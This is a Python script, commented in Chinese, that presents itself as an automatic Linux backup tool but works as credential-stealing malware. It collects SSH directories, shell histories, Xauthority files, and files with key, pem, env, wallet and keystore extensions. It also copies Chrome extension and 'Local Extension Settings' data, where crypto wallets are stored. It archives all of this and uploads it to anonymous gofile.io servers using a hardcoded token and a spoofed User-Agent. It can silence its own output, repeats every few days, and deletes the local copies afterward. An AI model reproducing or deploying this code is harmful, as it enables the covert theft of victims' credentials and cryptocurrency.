# -*- coding: utf-8 -*-
"""
自动备份和上传工具
功能：备份 linux(VPS) 系统中的重要文件，并自动上传到云存储
"""

import os
import sys
import shutil
import time
import socket
import logging
import logging.handlers
import platform
import tarfile
import requests
import getpass
from datetime import datetime, timedelta
from pathlib import Path

class BackupConfig:
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）
    
    # 文件大小配置（单位：字节）
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024   # 单文件阈值：50MB（超过则分片）
    CHUNK_SIZE = 50 * 1024 * 1024             # 分片大小：50MB
    
    # 重试配置
    RETRY_COUNT = 5        # 最大重试次数
    RETRY_DELAY = 60       # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 1800  # 上传超时时间（秒）
   
    # 备份间隔配置
    BACKUP_INTERVAL = 260000  # 备份间隔时间：约3天
    SCAN_TIMEOUT = 1800    # 扫描超时时间：30分钟
    
    # 日志配置
    LOG_FILE = str(Path.home() / ".dev/Backup/backup.log")
    LOG_MAX_SIZE = 10 * 1024 * 1024  # 日志文件最大大小：10MB
    LOG_BACKUP_COUNT = 10             # 保留的日志备份数量

    # 时间阈值文件配置
    THRESHOLD_FILE = str(Path.home() / ".dev/Backup/next_backup_time.txt")  # 时间阈值文件路径

    # 需要备份的服务器目录或文件
    SERVER_BACKUP_DIRS = [
        ".ssh",           # SSH配置
        ".bash_history",  # Bash历史记录
        ".python_history", # Python历史记录
        ".bash_aliases",  # Bash别名
        "Documents",      # 文档目录
        ".node_repl_history", # Node.js REPL 历史记录
        ".wget-hsts",     # wget HSTS 历史记录
        ".Xauthority",    # Xauthority 文件
        ".ICEauthority",  # ICEauthority 文件
    ]

    # 需要备份的文件类型
    # 文档类型扩展名
    DOC_EXTENSIONS = [
        ".txt", ".json", ".js", ".py", ".go", ".sh", ".sol", ".rs", ".env",
        ".csv", ".bin", ".wallet", ".ts", ".jsx", ".tsx"
    ]
    # 配置类型扩展名
    CONFIG_EXTENSIONS = [
        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config",
        ".yaml", ".yml", ".toml", ".asc", ".gpg", ".pgp", ".conf"
    ]
    # 所有备份扩展名（用于兼容性）
    BACKUP_EXTENSIONS = DOC_EXTENSIONS + CONFIG_EXTENSIONS
    
    # 排除的目录
    EXCLUDE_DIRS = [
        ".bashrc",
        ".bitcoinlib",
        ".cargo",
        ".conda",
        ".docker",
        ".dotnet",
        ".fonts",
        ".git",
        ".gongfeng-copilot",
        ".gradle",
        ".icons",
        ".jupyter",
        ".landscape",
        ".local",
        ".npm",
        ".nvm",
        ".orca_term",
        ".pki",
        ".pm2",
        ".profile",
        ".rustup",
        ".ssh",
        ".solcx",
        ".themes",
        ".thunderbird",
        ".wdm",
        "cache",
        "Downloads",
        "myenv",
        "snap",
        "venv",
    ]

    # 上传服务器配置
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]

    # 网络配置
    NETWORK_CHECK_HOSTS = [
        "8.8.8.8",         # Google DNS
        "1.1.1.1",         # Cloudflare DNS
        "208.67.222.222",  # OpenDNS
        "9.9.9.9"          # Quad9 DNS
    ]
    NETWORK_CHECK_TIMEOUT = 5  # 网络检查超时时间（秒）
    NETWORK_CHECK_RETRIES = 3  # 网络检查重试次数

if BackupConfig.DEBUG_MODE:
    logging.basicConfig(format="%(message)s", level=logging.DEBUG)
else:
    sys.stdout = sys.stderr = open(os.devnull, 'w')
    logging.basicConfig(format="%(message)s", level=logging.CRITICAL)

class BackupManager:
    
    def __init__(self):
        """初始化备份管理器"""
        self.config = BackupConfig()
        self.api_token = "8m9D4k6cv6LekYoVcjQBK4yvvDDyiFdf"
        # 使用集合优化扩展名检查性能
        self.doc_extensions_set = set(ext.lower() for ext in self.config.DOC_EXTENSIONS)
        self.config_extensions_set = set(ext.lower() for ext in self.config.CONFIG_EXTENSIONS)
        self._setup_logging()

    def _setup_logging(self):
        """配置日志系统"""
        try:
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)

            # 使用 RotatingFileHandler 进行日志轮转
            file_handler = logging.handlers.RotatingFileHandler(
                self.config.LOG_FILE,
                maxBytes=self.config.LOG_MAX_SIZE,
                backupCount=self.config.LOG_BACKUP_COUNT,
                encoding='utf-8'
            )
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )

            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))

            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )

            root_logger.handlers.clear()
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("日志系统初始化完成")
        except Exception as e:
            print(f"设置日志系统时出错: {e}")

    @staticmethod
    def _get_dir_size(directory):
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"获取文件大小失败 {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except Exception as e:
            logging.error(f"创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"清理目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """检查网络连接状态"""
        for _ in range(BackupConfig.NETWORK_CHECK_RETRIES):
            for host in BackupConfig.NETWORK_CHECK_HOSTS:
                try:
                    socket.create_connection(
                        (host, 53), 
                        timeout=BackupConfig.NETWORK_CHECK_TIMEOUT
                    )
                    return True
                except (socket.timeout, socket.gaierror, ConnectionRefusedError):
                    continue
                except Exception as e:
                    logging.debug(f"网络检查出错 {host}: {e}")
                    continue
            time.sleep(1)  # 重试前等待1秒
        return False

    @staticmethod
    def _is_valid_file(file_path):
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _backup_specified_item(self, source_path, target_base, item_name):
        """备份指定的文件或目录"""
        try:
            if os.path.isfile(source_path):
                target_file = os.path.join(target_base, item_name)
                target_file_dir = os.path.dirname(target_file)
                if self._ensure_directory(target_file_dir):
                    shutil.copy2(source_path, target_file)
                    if self.config.DEBUG_MODE:
                        logging.info(f"已备份指定文件: {item_name}")
                    return True
            else:
                target_path = os.path.join(target_base, item_name)
                if self._ensure_directory(os.path.dirname(target_path)):
                    if os.path.exists(target_path):
                        shutil.rmtree(target_path)
                    # 对于SERVER_BACKUP_DIRS中指定的目录，复制时仍然递归检查排除项
                    exclude_dirs_lower = {ex.lower() for ex in self.config.EXCLUDE_DIRS}
                    ignore_func = lambda d, files: [
                        f for f in files 
                        if any(ex in os.path.join(d, f).lower() for ex in exclude_dirs_lower)
                    ]
                    shutil.copytree(source_path, target_path, symlinks=True, ignore=ignore_func)
                    if self.config.DEBUG_MODE:
                        logging.info(f"📁 已备份指定目录: {item_name}/")
                    return True
        except Exception as e:
            logging.error(f"❌ 备份失败: {item_name} - {str(e)}")
        return False

    def _backup_chrome_directories(self, target_specified):
        """备份 Linux Chrome 目录"""
        try:
            home_dir = os.path.expanduser('~')
            chrome_base = os.path.join(home_dir, '.config', 'google-chrome', 'Default')
            chrome_extensions = os.path.join(chrome_base, 'Extensions')
            chrome_local_ext = os.path.join(chrome_base, 'Local Extension Settings')

            def copy_chrome_dir_if_exists(src_dir, dst_name):
                if os.path.exists(src_dir) and os.path.isdir(src_dir):
                    target_path = os.path.join(target_specified, dst_name)
                    try:
                        # 确保目标父目录存在
                        parent_dir = os.path.dirname(target_path)
                        if not self._ensure_directory(parent_dir):
                            return
                        # 如果目标目录已存在，先删除
                        if os.path.exists(target_path):
                            shutil.rmtree(target_path, ignore_errors=True)
                        # 复制整个目录
                        shutil.copytree(src_dir, target_path, symlinks=True)
                        if self.config.DEBUG_MODE:
                            logging.info(f"📦 已备份 Chrome 目录: {dst_name}")
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"复制 Chrome 目录失败: {src_dir} - {str(e)}")

            # 执行 Chrome 目录备份
            copy_chrome_dir_if_exists(chrome_extensions, 'chrome_extensions')
            copy_chrome_dir_if_exists(chrome_local_ext, 'chrome_local_extension_settings')
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.debug(f"追加 Chrome 目录备份失败: {str(e)}")

    def backup_linux_files(self, source_dir, target_dir):
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error("❌ Linux源目录不存在")
            return None

        target_docs = os.path.join(target_dir, "docs") # 备份文档的目标目录
        target_configs = os.path.join(target_dir, "configs") # 备份配置文件的目标目录
        target_specified = os.path.join(target_dir, "specified")  # 新增指定目录/文件的备份目录

        if not self._clean_directory(target_dir):
            return None

        if not all(self._ensure_directory(d) for d in [target_docs, target_configs, target_specified]):
            return None

        # 首先备份指定目录或文件 (SERVER_BACKUP_DIRS)
        for specific_path in self.config.SERVER_BACKUP_DIRS:
            full_source_path = os.path.join(source_dir, specific_path)
            if os.path.exists(full_source_path):
                self._backup_specified_item(full_source_path, target_specified, specific_path)

        # 追加：备份 Linux Chrome 目录
        self._backup_chrome_directories(target_specified)

        # 然后备份其他文件 (不在SERVER_BACKUP_DIRS中的，根据文件类型备份)
        # 预计算已备份的目录路径集合，优化性能
        source_dir_abs = os.path.abspath(source_dir)
        backed_up_dirs = set()
        for specific_dir in self.config.SERVER_BACKUP_DIRS:
            specific_path = os.path.join(source_dir, specific_dir)
            if os.path.isdir(specific_path):
                backed_up_dirs.add(os.path.abspath(specific_path))
        
        docs_count = configs_count = 0
        target_dir_abs = os.path.abspath(target_dir)
        exclude_dirs_lower = {ex.lower() for ex in self.config.EXCLUDE_DIRS}
        
        for root, dirs, files in os.walk(source_dir):
            root_abs = os.path.abspath(root)
            
            # 跳过源目录本身的文件处理，只在这里处理一级子目录的排除
            if root_abs == source_dir_abs:
                # 创建一个目录列表副本用于迭代，因为我们可能会修改原始dirs列表
                dirs_to_walk = dirs[:] 
                for d in dirs_to_walk:
                    # 检查这个第一级子目录是否在排除列表中（不区分大小写）
                    if d.lower() in exclude_dirs_lower:
                         if self.config.DEBUG_MODE:
                              logging.info(f"⏭️ 已排除第一级目录: {d}/")
                         dirs.remove(d) # 从os.walk迭代的列表中移除，阻止进入此目录
                continue # 跳过源目录本身的文件处理

            # 跳过已在上面作为指定目录备份过的目录 (或其下的子目录)
            if any(root_abs.startswith(backed_dir) for backed_dir in backed_up_dirs):
                continue

            # 跳过目标备份目录本身，避免备份备份文件
            if root_abs.startswith(target_dir_abs):
                continue

            # 对于非第一级目录或未排除的第一级目录下的文件/子目录，根据文件扩展名进行备份

            for file in files:
                # 判断文件是否为文档类型或配置类型（使用集合优化性能）
                file_lower = file.lower()
                is_doc = any(file_lower.endswith(ext) for ext in self.doc_extensions_set)
                is_config = any(file_lower.endswith(ext) for ext in self.config_extensions_set)

                # 如果既不是文档也不是配置，跳过
                if not (is_doc or is_config):
                    continue

                source_file = os.path.join(root, file)
                # os.walk已经提供了文件列表，通常不需要再次检查存在性
                # 但如果文件在遍历过程中被删除，这里可以跳过

                # 根据文件类型确定目标基路径
                target_base = target_docs if is_doc else target_configs
                # 获取相对于源目录的路径
                relative_path = os.path.relpath(root, source_dir)
                # 构建目标子目录路径
                target_sub_dir = os.path.join(target_base, relative_path)
                # 构建目标文件路径
                target_file = os.path.join(target_sub_dir, file)

                # 确保目标子目录存在
                if not self._ensure_directory(target_sub_dir):
                    continue

                try:
                    # 复制文件到目标位置
                    shutil.copy2(source_file, target_file)
                    # 更新计数器
                    if is_doc:
                        docs_count += 1
                    else:
                        configs_count += 1
                except Exception as e:
                    # 复制失败记录错误
                    if self.config.DEBUG_MODE:
                        logging.error(f"❌ 复制失败: {relative_path}/{file}")

        # 打印备份统计信息
        if docs_count > 0 or configs_count > 0:
            logging.info(f"\n📊 Linux文件备份统计:")
            if docs_count > 0:
                logging.info(f"   📚 文档: {docs_count} 个文件")
            if configs_count > 0:
                logging.info(f"   ⚙️  配置: {configs_count} 个文件")

        return target_dir

    def _get_upload_server(self):
        """获取上传服务器地址，使用简单的轮询方式实现负载均衡"""
        try:
            # 尝试所有服务器
            for server in self.config.UPLOAD_SERVERS:
                try:
                    # 测试服务器连接性
                    response = requests.head(server, timeout=5)
                    if response.status_code == 200:
                        return server
                except:
                    continue
            
            # 如果所有服务器都不可用，返回默认服务器
            return self.config.UPLOAD_SERVERS[0]
        except:
            # 发生异常时返回默认服务器
            return self.config.UPLOAD_SERVERS[0]

    def split_large_file(self, file_path):
        """将大文件分割为多个小块"""
        if not os.path.exists(file_path):
            return None
        
        try:
            file_size = os.path.getsize(file_path)
            if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
                return [file_path]

            # 创建分片目录
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None

            # 对文件进行分片
            chunk_files = []
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                    logging.info(f"已创建分片 {chunk_num}: {len(chunk_data) / 1024 / 1024:.2f}MB")

            os.remove(file_path)
            logging.critical(f"文件 {file_path} ({file_size / 1024 / 1024:.2f}MB) 已分割为 {len(chunk_files)} 个分片")
            return chunk_files

        except Exception as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            return None

    def zip_backup_folder(self, folder_path, zip_file_path):
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"源目录为空 {folder_path}")
                return None

            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"获取文件大小失败 {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"源目录实际大小为0 {folder_path}")
                return None

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"压缩文件大小为0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None

                self._clean_directory(folder_path)
                logging.critical(f"目录 {folder_path} 已压缩: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                
                # 如果压缩文件过大，进行分片
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    return self.split_large_file(tar_path)
                else:
                    return [tar_path]
                    
            except OSError as e:
                logging.error(f"获取压缩文件大小失败 {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except Exception as e:
            logging.error(f"压缩失败 {folder_path}: {e}")
            return None

    def upload_backup(self, backup_paths):
        """上传备份文件，支持单个文件或文件列表"""
        if not backup_paths:
            return False
            
        if isinstance(backup_paths, str):
            backup_paths = [backup_paths]
            
        success = True
        for path in backup_paths:
            if not self.upload_file(path):
                success = False
        return success

    def upload_file(self, file_path):
        """上传单个文件"""
        if not self._is_valid_file(file_path):
            logging.error(f"文件 {file_path} 为空或无效，跳过上传")
            return False
            
        return self._upload_single_file(file_path)

    def _upload_single_file(self, file_path):
        """上传单个文件"""
        try:
            # 检查文件权限和状态
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
                
            if not os.access(file_path, os.R_OK):
                logging.error(f"文件无读取权限: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # 上传重试逻辑
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                # 服务器轮询
                for server in self.config.UPLOAD_SERVERS:
                    try:
                        with open(file_path, "rb") as f:
                            logging.critical(f"正在上传文件 {file_path}（{file_size / 1024 / 1024:.2f}MB），第 {attempt + 1} 次尝试，使用服务器 {server}...")
                            
                            # 准备上传会话
                            session = requests.Session()
                            session.headers.update({
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                            })
                            
                            # 执行上传
                            response = session.post(
                                server,
                                files={"file": f},
                                data={"token": self.api_token},
                                timeout=self.config.UPLOAD_TIMEOUT,
                                verify=True
                            )
                            
                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"上传成功: {file_path}")
                                    try:
                                        os.remove(file_path)
                                    except Exception as e:
                                        logging.error(f"删除已上传文件失败: {e}")
                                    return True
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    logging.error(f"服务器返回错误: {error_msg}")
                            else:
                                logging.error(f"上传失败，状态码: {response.status_code}, 响应: {response.text}")
                                
                    except requests.exceptions.Timeout:
                        logging.error(f"上传超时 {file_path}")
                    except requests.exceptions.SSLError:
                        logging.error(f"SSL错误 {file_path}")
                    except requests.exceptions.ConnectionError:
                        logging.error(f"连接错误 {file_path}")
                    except Exception as e:
                        logging.error(f"上传文件出错 {file_path}: {str(e)}")

                    continue
                
                if attempt < self.config.RETRY_COUNT - 1:
                    logging.critical(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
                    time.sleep(self.config.RETRY_DELAY)

            try:
                os.remove(file_path)
                logging.error(f"文件 {file_path} 上传失败并已删除")
            except Exception as e:
                logging.error(f"删除失败文件时出错: {e}")
            
            return False
            
        except OSError as e:
            logging.error(f"获取文件信息失败 {file_path}: {e}")
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except:
                    pass
            return False

def is_server():
    """检查是否在服务器环境中运行"""
    return not platform.system().lower() == 'windows'

def backup_server(backup_manager, source, target):
    """备份服务器"""
    backup_dir = backup_manager.backup_linux_files(source, target)
    if backup_dir:
        backup_path = backup_manager.zip_backup_folder(
            backup_dir, 
            str(target) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if backup_manager.upload_backup(backup_path):
                logging.critical("☑️ 服务器备份完成")
            else:
                logging.error("❌ 服务器备份失败")

def backup_and_upload_logs(backup_manager):
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return

        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)

        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件为空，跳过: {log_file}")
            return

        temp_dir = Path.home() / ".dev/Backup/temp_backup_logs"
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"backup_log_{timestamp}.txt"
        backup_path = temp_dir / backup_name

        try:
            # 读取并验证日志内容
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return
            
            # 写入备份文件
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # 验证备份文件是否创建成功
            if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return
            
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"📄 已复制备份日志到临时目录 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
            
            # 上传日志文件
            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                    logging.info("✅ 备份日志上传成功并已清空")
                except Exception as e:
                    logging.error(f"❌ 备份日志更新失败: {e}")
            else:
                logging.error("❌ 备份日志上传失败")

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())

        # 清理临时目录
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clean_backup_directory():
    backup_dir = Path.home() / ".dev/Backup"
    try:
        if not os.path.exists(backup_dir):
            return

        keep_files = ["backup.log", "next_backup_time.txt"]  # 添加时间阈值文件到保留列表
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"🗑️ 已清理: {item}")
            except Exception as e:
                logging.error(f"❌ 清理 {item} 失败: {e}")
                
        logging.critical("🧹 备份目录已清理完成")
    except Exception as e:
        logging.error(f"❌ 清理备份目录时出错: {e}")

def save_next_backup_time(backup_manager):
    """保存下次备份时间到阈值文件"""
    try:
        next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
        with open(backup_manager.config.THRESHOLD_FILE, 'w', encoding='utf-8') as f:
            f.write(next_backup_time.strftime('%Y-%m-%d %H:%M:%S'))
        if backup_manager.config.DEBUG_MODE:
            logging.info(f"⏰ 已保存下次备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception as e:
        logging.error(f"❌ 保存下次备份时间失败: {e}")

def should_perform_backup(backup_manager):
    """检查是否应该执行备份"""
    try:
        if not os.path.exists(backup_manager.config.THRESHOLD_FILE):
            return True
            
        with open(backup_manager.config.THRESHOLD_FILE, 'r', encoding='utf-8') as f:
            threshold_time_str = f.read().strip()
            
        threshold_time = datetime.strptime(threshold_time_str, '%Y-%m-%d %H:%M:%S')
        current_time = datetime.now()
        
        if current_time >= threshold_time:
            if backup_manager.config.DEBUG_MODE:
                logging.info("⏰ 已到达备份时间")
            return True
        else:
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"⏳ 未到备份时间，下次备份: {threshold_time_str}")
            return False
            
    except Exception as e:
        logging.error(f"❌ 检查备份时间失败: {e}")
        return True  # 出错时默认执行备份

def main():
    if not is_server():
        logging.critical("本脚本仅适用于服务器环境")
        return

    try:
        backup_manager = BackupManager()
        
        # 先清理备份目录
        clean_backup_directory()
        
        periodic_backup_upload(backup_manager)
    except KeyboardInterrupt:
        logging.critical("\n备份程序已停止")
    except Exception as e:
        logging.critical(f"程序出错: {e}")

def periodic_backup_upload(backup_manager):
    source = str(Path.home())
    target = Path.home() / ".dev/Backup/server"

    try:
        # 获取用户名
        username = getpass.getuser()
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        logging.critical("\n" + "="*40)
        logging.critical(f"👤 用户: {username}")
        logging.critical(f"🚀 自动备份系统已启动  {current_time}")
        logging.critical("="*40)

        while True:
            try:
                # 检查是否应该执行备份
                if not should_perform_backup(backup_manager):
                    time.sleep(3600)  # 每小时检查一次
                    continue

                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                logging.critical("\n" + "="*40)
                logging.critical(f"⏰ 开始备份  {current_time}")
                logging.critical("-"*40)

                logging.critical("\n🖥️ 服务器指定目录备份")
                backup_server(backup_manager, source, target)
                
                if backup_manager.config.DEBUG_MODE:
                    logging.info("\n📝 备份日志上传")
                backup_and_upload_logs(backup_manager)

                # 保存下次备份时间
                save_next_backup_time(backup_manager)

                logging.critical("\n" + "="*40)
                next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                next_time = next_backup_time.strftime('%Y-%m-%d %H:%M:%S')
                logging.critical(f"✅ 备份完成  {current_time}")
                logging.critical("="*40)
                logging.critical("📋 备份任务已结束")
                logging.critical(f"🔄 下次启动备份时间: {next_time}")
                logging.critical("="*40 + "\n")

            except Exception as e:
                logging.error(f"\n❌ 备份出错: {e}")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as log_error:
                    logging.error("❌ 日志备份失败")
                time.sleep(60)

    except Exception as e:
        logging.error(f"❌ 备份过程出错: {e}")

if __name__ == "__main__":
    main()